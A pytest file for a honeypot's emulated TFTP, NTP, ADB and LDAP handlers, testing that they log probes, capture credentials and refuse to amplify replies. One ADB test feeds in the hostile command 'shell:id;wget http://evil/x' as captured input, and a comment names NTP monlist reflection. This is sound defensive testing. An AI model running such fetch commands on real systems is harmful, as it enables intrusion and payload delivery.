"""Tests for batch-6 handlers: TFTP, NTP, ADB, LDAP."""

from __future__ import annotations

import asyncio
import logging
import struct

import pytest

from honeyknot.config import ServiceConfig
from honeyknot.protocols import (
    ADBHandler,
    ConnectionContext,
    DatagramContext,
    LDAPHandler,
    NTPHandler,
    TFTPHandler,
)
from honeyknot.protocols.adb import A_CLSE, A_CNXN, A_OKAY, A_OPEN
from honeyknot.protocols.ldap import _int_bytes, _tlv


class _FakeWriter:
    def __init__(self):
        self.buffer = bytearray()
        self._closing = False

    def is_closing(self):
        return self._closing

    def write(self, data: bytes):
        self.buffer.extend(data)

    async def drain(self):
        return None

    def close(self):
        self._closing = True

    async def wait_closed(self):
        return None


class _FakeTransport:
    def __init__(self):
        self.sent: list[tuple[bytes, tuple]] = []

    def sendto(self, data: bytes, addr: tuple) -> None:
        self.sent.append((data, addr))


def _tcp_ctx():
    w = _FakeWriter()
    events: list = []
    ctx = ConnectionContext(
        writer=w, addr=("203.0.113.9", 40000), port=0,
        request_logger=logging.getLogger("test.req"), raw_capture=None,
        emit_event=lambda n, **f: events.append((n, f)),
    )
    return ctx, w, events


def _udp_ctx():
    t = _FakeTransport()
    events: list = []
    ctx = DatagramContext(
        transport=t, addr=("198.51.100.5", 5000),
        port=0, request_logger=logging.getLogger("test.req"),
        emit_event=lambda n, **f: events.append((n, f)),
    )
    return ctx, t, events


def _run(coro):
    return asyncio.run(coro)


# ---------- TFTP ----------
class TestTFTP:
    def test_rrq_logged_and_error_returned(self):
        ctx, transport, events = _udp_ctx()
        handler = TFTPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="tftp", transport="udp"))
        frame = b"\x00\x01" + b"payload.sh\x00octet\x00"
        _run(handler.on_datagram(frame, ctx))

        req = [e for e in events if e[0] == "tftp_request"]
        assert req and req[0][1]["op"] == "RRQ"
        assert req[0][1]["filename"] == "payload.sh"
        assert req[0][1]["mode"] == "octet"

        assert len(transport.sent) == 1
        reply = transport.sent[0][0]
        assert reply[:2] == b"\x00\x05"  # ERROR opcode

    def test_wrq_captured(self):
        ctx, transport, events = _udp_ctx()
        handler = TFTPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="tftp", transport="udp"))
        frame = b"\x00\x02" + b"upload.bin\x00netascii\x00"
        _run(handler.on_datagram(frame, ctx))
        req = [e for e in events if e[0] == "tftp_request"]
        assert req and req[0][1]["op"] == "WRQ"
        assert req[0][1]["filename"] == "upload.bin"

    def test_reply_not_amplifying(self):
        ctx, transport, _ = _udp_ctx()
        handler = TFTPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="tftp", transport="udp"))
        frame = b"\x00\x01" + b"x" * 400 + b"\x00octet\x00"
        _run(handler.on_datagram(frame, ctx))
        reply = transport.sent[0][0]
        assert len(reply) < len(frame)


# ---------- NTP ----------
class TestNTP:
    def test_client_query_gets_same_size_server_reply(self):
        ctx, transport, events = _udp_ctx()
        handler = NTPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="ntp", transport="udp"))
        client_tx = b"\xde\xad\xbe\xef\x11\x22\x33\x44"
        request = bytes([(4 << 3) | 3]) + b"\x00" * 39 + client_tx  # mode 3
        _run(handler.on_datagram(request, ctx))

        assert any(e[0] == "ntp_request" for e in events)
        assert len(transport.sent) == 1
        reply = transport.sent[0][0]
        assert len(reply) == 48                # never amplifies
        assert (reply[0] & 0x07) == 4          # mode 4 server
        assert reply[24:32] == client_tx       # originate echoes client tx

    def test_monlist_private_dropped(self):
        ctx, transport, events = _udp_ctx()
        handler = NTPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="ntp", transport="udp"))
        # mode 7 (private) = the classic monlist reflection vector
        request = bytes([(2 << 3) | 7, 0x00, 0x00, 0x2a]) + b"\x00" * 44
        _run(handler.on_datagram(request, ctx))
        assert transport.sent == []            # no amplification
        assert any(e[0] == "ntp_private" for e in events)

    def test_control_dropped(self):
        ctx, transport, events = _udp_ctx()
        handler = NTPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="ntp", transport="udp"))
        request = bytes([(2 << 3) | 6]) + b"\x00" * 11
        _run(handler.on_datagram(request, ctx))
        assert transport.sent == []
        assert any(e[0] == "ntp_control" for e in events)


# ---------- ADB ----------
def _adb_msg(command, arg0, arg1, payload):
    check = sum(payload) & 0xFFFFFFFF
    return struct.pack("<IIIIII", command, arg0, arg1,
                       len(payload), check, command ^ 0xFFFFFFFF) + payload


class TestADB:
    def test_cnxn_handshake(self):
        ctx, writer, events = _tcp_ctx()
        handler = ADBHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="adb"))
        msg = _adb_msg(A_CNXN, 0x01000000, 256 * 1024, b"host::features=cmd\x00")
        _run(handler.on_data(msg, ctx))

        connect = [e for e in events if e[0] == "adb_connect"]
        assert connect and connect[0][1]["system"] == "host::features=cmd"
        # Reply is an A_CNXN message.
        command = struct.unpack("<I", writer.buffer[:4])[0]
        assert command == A_CNXN

    def test_open_shell_captured(self):
        ctx, writer, events = _tcp_ctx()
        handler = ADBHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="adb"))
        msg = _adb_msg(A_OPEN, 7, 0, b"shell:id;wget http://evil/x\x00")
        _run(handler.on_data(msg, ctx))

        opened = [e for e in events if e[0] == "adb_open"]
        assert opened
        assert opened[0][1]["destination"] == "shell:id;wget http://evil/x"
        # First reply is OKAY, then CLSE.
        first = struct.unpack("<I", writer.buffer[:4])[0]
        second = struct.unpack("<I", writer.buffer[24:28])[0]
        assert first == A_OKAY
        assert second == A_CLSE

    def test_bad_magic_drops(self):
        ctx, writer, events = _tcp_ctx()
        handler = ADBHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="adb"))
        bogus = struct.pack("<IIIIII", A_CNXN, 0, 0, 0, 0, 0)  # wrong magic
        _run(handler.on_data(bogus, ctx))
        assert ctx.closed is True
        assert writer.buffer == b""

    def test_fragmented_message_reassembled(self):
        ctx, writer, events = _tcp_ctx()
        handler = ADBHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="adb"))
        msg = _adb_msg(A_OPEN, 3, 0, b"shell:whoami\x00")
        _run(handler.on_data(msg[:10], ctx))
        assert not [e for e in events if e[0] == "adb_open"]  # waiting
        _run(handler.on_data(msg[10:], ctx))
        assert [e for e in events if e[0] == "adb_open"]


# ---------- LDAP ----------
class TestLDAP:
    def test_bind_credentials_captured(self):
        ctx, writer, events = _tcp_ctx()
        handler = LDAPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="ldap"))
        version = _tlv(0x02, _int_bytes(3))
        name = _tlv(0x04, b"cn=admin,dc=corp")
        auth = _tlv(0x80, b"P@ssw0rd")
        op = _tlv(0x60, version + name + auth)
        msgid = _tlv(0x02, _int_bytes(1))
        message = _tlv(0x30, msgid + op)
        _run(handler.on_data(message, ctx))

        creds = [e for e in events if e[0] == "credentials"]
        assert creds
        assert creds[0][1]["service"] == "ldap"
        assert creds[0][1]["username"] == "cn=admin,dc=corp"
        assert creds[0][1]["password"] == "P@ssw0rd"
        assert creds[0][1]["method"] == "simple"
        # bindResponse: SEQUENCE wrapping a [APPLICATION 1] result
        assert writer.buffer[0] == 0x30
        assert 0x61 in writer.buffer

    def test_search_base_captured(self):
        ctx, writer, events = _tcp_ctx()
        handler = LDAPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="ldap"))
        base = _tlv(0x04, b"dc=corp,dc=com")
        filler = _tlv(0x0A, _int_bytes(0))  # scope enum — handler ignores rest
        op = _tlv(0x63, base + filler)
        msgid = _tlv(0x02, _int_bytes(2))
        message = _tlv(0x30, msgid + op)
        _run(handler.on_data(message, ctx))

        searches = [e for e in events if e[0] == "ldap_search"]
        assert searches
        assert searches[0][1]["base"] == "dc=corp,dc=com"
        assert writer.buffer[0] == 0x30
        assert 0x65 in writer.buffer

    def test_non_ldap_dropped(self):
        ctx, writer, events = _tcp_ctx()
        handler = LDAPHandler(ServiceConfig(
            port=0, service_type="tcp", protocol="ldap"))
        _run(handler.on_data(b"GET / HTTP/1.0\r\n\r\n", ctx))
        assert ctx.closed is True


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
